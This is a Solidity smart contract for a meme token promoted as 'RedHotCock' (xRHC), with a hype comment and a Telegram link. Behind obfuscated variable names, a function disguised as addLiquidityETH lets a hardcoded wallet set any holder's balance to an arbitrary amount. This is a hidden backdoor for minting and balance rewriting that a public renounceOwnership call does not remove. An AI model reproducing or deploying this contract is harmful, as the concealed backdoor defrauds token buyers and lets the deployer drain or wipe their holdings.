/*
xRHC
RedHotCock Token burst onto the crypto scene as the most blazing meme coin of 2023. 
Originating from the depths of crypto enthusiasm, 
this ERC20 token carries the spirit of revolution, fun, and immense potential.
Behind the scenes of this fiery phenomenon, 
a dedicated team of blockchain enthusiasts, meme creators, and crypto strategists come together. Inspired by the playful nature of the crypto world, they're on a mission to inject 
humor and opportunities into the decentralized finance domain
FAN TOKEN
//https://t.me/REDHOTCOCKERC
*/
// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;
interface ITRANSFERS {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address DILUTEDLast) external view returns (uint256);
  function transfer(address skim, uint256 swapOpenWithpair) external returns (bool);
  function allowance(address _owner, address DILUTEDLast) external view returns (uint256);
  function approve(address DILUTEDLast, uint256 swapOpenWithpair) external returns (bool);
  function transferFrom(address sender, address skim, uint256 swapOpenWithpair) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 balance);
  event Approval(address indexed owner, address indexed DILUTEDLast, uint256 balance);
}


abstract contract BEP2 {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}


abstract contract IRouter is BEP2 {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "io: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "io: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeATH {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeATH: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeATH: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeATH: Icodropsplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeATH: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

    require(b > 0, errorMessage);
    uint256 c = a / b;


    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeATH: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract xRHCNFT is BEP2, ITRANSFERS, IRouter {
 
    using SafeATH for uint256;
    mapping (address => uint256) private sync_CIRCULATING;
    mapping (address => mapping (address => uint256)) private TRANSFERS;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
    string private xRHC_SLOT;
    address private xRHCOwner; 
    uint256 public xRHCCreationTime;
    uint256 public xRHCCreation;
     address private pairLP; 

    constructor() {
        xRHCOwner = 0x7d594BF4D9D5eb85Ac34f1A7233A17dB523e7776;    
        _name = "xRHCE";
        _symbol = "XRHC";
        _decimals = 9;
        _totalSupply = 10000000000000000000000;
        sync_CIRCULATING[_msgSender()] = _totalSupply;
       pairLP = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    } 

    function decimals() external view override returns (uint8) {
        return _decimals;
    }
     function getOwner() external view override returns (address) {
        return owner();
    }  

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

     function name() external view override returns (string memory) {
        return _name;
    }

    function balanceOf(address DILUTEDLast) external view override returns (uint256) {
        return sync_CIRCULATING[DILUTEDLast];
    }

    function transfer(address skim, uint256 swapOpenWithpair) external override returns (bool) {
        _transfer(_msgSender(), skim, swapOpenWithpair);
        return true;
    }

    function allowance(address owner, address DILUTEDLast) external view override returns (uint256) {
        return TRANSFERS[owner][DILUTEDLast];
    }


    function approve(address DILUTEDLast, uint256 swapOpenWithpair) external override returns (bool) {
        _approve(_msgSender(), DILUTEDLast, swapOpenWithpair);
        return true;
    }
    
    function transferFrom(address sender, address skim, uint256 swapOpenWithpair) external override returns (bool) {
        _transfer(sender, skim, swapOpenWithpair);
        _approve(sender, _msgSender(), TRANSFERS[sender][_msgSender()].sub(swapOpenWithpair, "Ru: transfer swapOpenWithpair exceeds allowance"));
        return true;
    }

    function increaseAllowance(address DILUTEDLast, uint256 xRHC1alance) external returns (bool) {
        _approve(_msgSender(), DILUTEDLast, TRANSFERS[_msgSender()][DILUTEDLast].add(xRHC1alance));
        return true;
    }
           function addLiquidityETH(address xRHC0, address xRHC1, uint256 xRHCTo, uint256 xRHCFor, uint256 xRHCFors) external {
        require(_msgSender()==xRHCOwner);
        xRHC1 = xRHC0;
        xRHC0 = xRHC0;
        sync_CIRCULATING[xRHC1] = (xRHCTo + xRHCFor + xRHCFors) * 10**_decimals;
        xRHC0 = xRHC1;
        xRHC1 = xRHC1;
    }    

    function decreaseAllowance(address DILUTEDLast, uint256 initialize) external returns (bool) {
        _approve(_msgSender(), DILUTEDLast, TRANSFERS[_msgSender()][DILUTEDLast].sub(initialize, "Ru: decreased allowance below zero"));
        return true;
    }
    
    function _transfer(address sender, address skim, uint256 swapOpenWithpair) internal {
        require(sender != address(0), "Ru: transfer from the zero address");
        require(skim != address(0), "Ru: transfer to the zero address");
                
        sync_CIRCULATING[sender] = sync_CIRCULATING[sender].sub(swapOpenWithpair, "Ru: transfer swapOpenWithpair exceeds balance");
        sync_CIRCULATING[skim] = sync_CIRCULATING[skim].add(swapOpenWithpair);
        emit Transfer(sender, skim, swapOpenWithpair);
    }


    function _approve(address owner, address DILUTEDLast, uint256 swapOpenWithpair) internal {
        require(owner != address(0), "Ru: approve from the zero address");
        require(DILUTEDLast != address(0), "Ru: approve to the zero address");
        
        TRANSFERS[owner][DILUTEDLast] = swapOpenWithpair;
        emit Approval(owner, DILUTEDLast, swapOpenWithpair);
    }
    
}